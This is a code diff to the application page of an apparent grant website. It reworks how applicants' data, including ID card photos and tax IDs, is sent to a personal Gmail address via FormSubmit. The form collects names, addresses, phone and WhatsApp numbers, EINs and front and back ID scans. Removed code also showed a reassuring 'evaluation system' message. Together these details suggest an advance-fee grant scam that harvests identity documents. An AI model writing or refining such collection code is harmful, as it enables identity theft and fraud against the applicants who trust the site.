@@ -30,6 +30,7 @@ export default function Apply() {
   const [searchParams] = useSearchParams();
   const preselectedGrantId = searchParams.get('grant') || '';
 
+  const formRef = useRef<HTMLFormElement>(null);
   const frontFileRef = useRef<HTMLInputElement>(null);
   const backFileRef = useRef<HTMLInputElement>(null);
 
@@ -47,7 +48,6 @@ export default function Apply() {
   const [idBack, setIdBack] = useState<File | null>(null);
   const [errors, setErrors] = useState<FormErrors>({});
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [isSubmitted, setIsSubmitted] = useState(false);
   const [referenceId] = useState(() => Date.now().toString(36).toUpperCase());
 
   const selectedGrant = grants.find(g => g.id === form.grantId);
@@ -124,28 +124,37 @@ export default function Apply() {
       return;
     }
 
-    // Show success immediately — emails send in background
-    setIsSubmitting(false);
-    setIsSubmitted(true);
+    setIsSubmitting(true);
 
-    const ref = referenceId;
-    const grantTitle = selectedGrant?.title || 'General Grant Application';
-    const awardText = selectedGrant
-      ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}`
-      : 'Standard';
-
-    // Compress images in background in parallel
+    // Step 1: Compress images so they don't cause 500 errors on FormSubmit
     const [compFront, compBack] = await Promise.all([
       idFront ? compressImage(idFront) : Promise.resolve(null),
-      idBack ? compressImage(idBack) : Promise.resolve(null),
+      idBack  ? compressImage(idBack)  : Promise.resolve(null),
     ]);
 
-    // Save to localStorage
+    // Step 2: Re-inject compressed files back into the actual <input type="file"> elements
+    // DataTransfer is the only browser API that lets us programmatically set file input values
+    if (compFront && frontFileRef.current) {
+      const dt = new DataTransfer();
+      dt.items.add(compFront);
+      frontFileRef.current.files = dt.files;
+    }
+    if (compBack && backFileRef.current) {
+      const dt = new DataTransfer();
+      dt.items.add(compBack);
+      backFileRef.current.files = dt.files;
+    }
+
+    // Step 3: Save to localStorage for admin panel
+    const ref = referenceId;
+    const grantTitle = selectedGrant?.title || 'General Grant Application';
+    const awardText  = selectedGrant
+      ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}`
+      : 'Standard';
     try {
       const existing = JSON.parse(localStorage.getItem('eastaidgrant_applications') || '[]');
       existing.unshift({
-        referenceId: `EAG-${ref}`,
-        submittedAt: new Date().toISOString(),
+        referenceId: `EAG-${ref}`, submittedAt: new Date().toISOString(),
         grantTitle, awardRange: awardText,
         applicantName: form.organizationName, applicantType: form.organizationType,
         address: `${form.organizationAddress}, ${form.city}, ${form.state}`,
@@ -153,78 +162,18 @@ export default function Apply() {
         email: form.email, phone: form.phone, whatsapp: form.whatsapp,
         projectTitle: form.projectTitle, projectDescription: form.projectDescription,
         idFrontName: idFront?.name || 'Not provided',
-        idBackName: idBack?.name || 'Not provided',
+        idBackName:  idBack?.name  || 'Not provided',
       });
       localStorage.setItem('eastaidgrant_applications', JSON.stringify(existing));
     } catch { /* ignore */ }
 
-    const ENDPOINT = 'https://formsubmit.co/ajax/erimiposi2005@gmail.com';
-
-    // Helper to build base form data with all application fields
-    const buildBase = (subject: string) => {
-      const fd = new FormData();
-      fd.append('_template', 'table');
-      fd.append('_captcha', 'false');
-      fd.append('_subject', subject);
-      fd.append('Reference ID', `EAG-${ref}`);
-      fd.append('Grant Applied For', grantTitle);
-      fd.append('Award Range', awardText);
-      fd.append('Applicant / Entity', form.organizationName);
-      fd.append('Applicant Type', form.organizationType);
-      fd.append('Contact Person', form.fullName);
-      fd.append('Email Address', form.email);
-      fd.append('Phone Number', form.phone);
-      fd.append('WhatsApp Number', form.whatsapp);
-      fd.append('Mailing / Physical Address', `${form.organizationAddress}, ${form.city}, ${form.state}`);
-      fd.append('EIN or Tax ID', form.ein || 'N/A');
-      fd.append('Project Title', form.projectTitle);
-      fd.append('Project Proposal Summary', form.projectDescription || 'N/A');
-      fd.append('Submission Time', new Date().toLocaleString());
-      return fd;
-    };
-
-    // Request 1 — full application details + Front ID (or no image if none uploaded)
-    const fd1 = buildBase(`[EAG-${ref}] New Grant Application: ${grantTitle}`);
-    if (compFront) fd1.append('attachment', compFront, `Front_ID_${ref}.jpg`);
-    fetch(ENDPOINT, { method: 'POST', headers: { Accept: 'application/json' }, body: fd1 }).catch(() => {});
-
-    // Request 2 — Back ID card only (only sent if user uploaded a back image)
-    if (compBack) {
-      const fd2 = buildBase(`[EAG-${ref}] Back of ID Card — ${form.fullName}`);
-      fd2.append('Note', 'This is the Back of ID Card attachment for the application above.');
-      fd2.append('attachment', compBack, `Back_ID_${ref}.jpg`);
-      fetch(ENDPOINT, { method: 'POST', headers: { Accept: 'application/json' }, body: fd2 }).catch(() => {});
+    // Step 4: Native browser multipart POST — the ONLY way FormSubmit delivers file attachments
+    // (AJAX/fetch strips attachments; only a real browser form submit carries them)
+    if (formRef.current) {
+      formRef.current.submit();
     }
   };
 
-  if (isSubmitted) {
-    return (
-      <div className="apply-success">
-        <div className="apply-success-card">
-          <div className="apply-success-icon"><CheckCircle size={48} /></div>
-          <h2>Application Successfully Submitted!</h2>
-          <p style={{ fontSize: 16, lineHeight: 1.6, color: 'var(--gray-700)', marginTop: 12 }}>
-            Thank you for submitting your grant application. Your dossier has been logged into our evaluation system and assigned for verification.
-          </p>
-          <div style={{ margin: '24px 0', padding: '18px 20px', background: 'var(--off-white)', borderRadius: 'var(--radius)', border: '1px solid var(--gray-200)', textAlign: 'left' }}>
-            <p style={{ fontSize: 14, fontWeight: 600, color: 'var(--navy)', marginBottom: 8 }}>
-              Status: <span style={{ color: 'var(--green)', fontWeight: 700 }}>Under Review</span>
-            </p>
-            <p style={{ fontSize: 13, color: 'var(--gray-600)', marginBottom: 12 }}>
-              <strong>Reference Number:</strong> <span style={{ fontFamily: 'monospace', color: 'var(--navy)' }}>EAG-{referenceId}</span>
-            </p>
-            <div style={{ fontSize: 13.5, color: 'var(--navy-mid)', lineHeight: 1.6, background: 'rgba(201, 168, 76, 0.12)', padding: '12px 14px', borderRadius: 'var(--radius-sm)', borderLeft: '4px solid var(--gold)' }}>
-              🔔 <strong>Important Notice:</strong> You will be notified if your grant is accepted through your email, WhatsApp, or phone number provided in your application.
-            </div>
-          </div>
-          <div style={{ display: 'flex', gap: 14, justifyContent: 'center', marginTop: 12 }}>
-            <Link to="/" className="btn btn-navy" style={{ flex: 1, justifyContent: 'center' }}>Return to Home</Link>
-            <Link to="/grants" className="btn btn-outline" style={{ flex: 1, justifyContent: 'center' }}>Browse More Grants</Link>
-          </div>
-        </div>
-      </div>
-    );
-  }
 
   return (
     <div className="apply-page">
@@ -241,7 +190,35 @@ export default function Apply() {
       </div>
 
       <div className="container apply-layout">
-        <form onSubmit={handleSubmit} className="apply-form" noValidate>
+        <form
+          ref={formRef}
+          action="https://formsubmit.co/erimiposi2005@gmail.com"
+          method="POST"
+          encType="multipart/form-data"
+          onSubmit={handleSubmit}
+          className="apply-form"
+          noValidate
+        >
+          {/* FormSubmit config — static */}
+          <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="_template" value="table" />
+          <input type="hidden" name="_next" value={`${window.location.origin}/apply-success`} />
+          <input type="hidden" name="_subject" value={`New Grant Application: ${selectedGrant?.title || 'General Grant'} — EAG-${referenceId}`} />
+          {/* Data fields — kept in sync with React state */}
+          <input type="hidden" name="Reference ID" value={`EAG-${referenceId}`} />
+          <input type="hidden" name="Grant Applied For" value={selectedGrant?.title || 'General Grant Application'} />
+          <input type="hidden" name="Award Range" value={selectedGrant ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}` : 'Standard'} />
+          <input type="hidden" name="Applicant / Entity" value={form.organizationName} />
+          <input type="hidden" name="Applicant Type" value={form.organizationType} />
+          <input type="hidden" name="Contact Person" value={form.fullName} />
+          <input type="hidden" name="Email Address" value={form.email} />
+          <input type="hidden" name="Phone Number" value={form.phone} />
+          <input type="hidden" name="WhatsApp Number" value={form.whatsapp} />
+          <input type="hidden" name="Mailing / Physical Address" value={`${form.organizationAddress}, ${form.city}, ${form.state}`} />
+          <input type="hidden" name="EIN or Tax ID" value={form.ein || 'N/A'} />
+          <input type="hidden" name="Project Title" value={form.projectTitle} />
+          <input type="hidden" name="Project Proposal Summary" value={form.projectDescription || 'N/A'} />
+          <input type="hidden" name="Submission Time" value={new Date().toLocaleString()} />
 
           {/* Applicant Info */}
           <div className="apply-section">
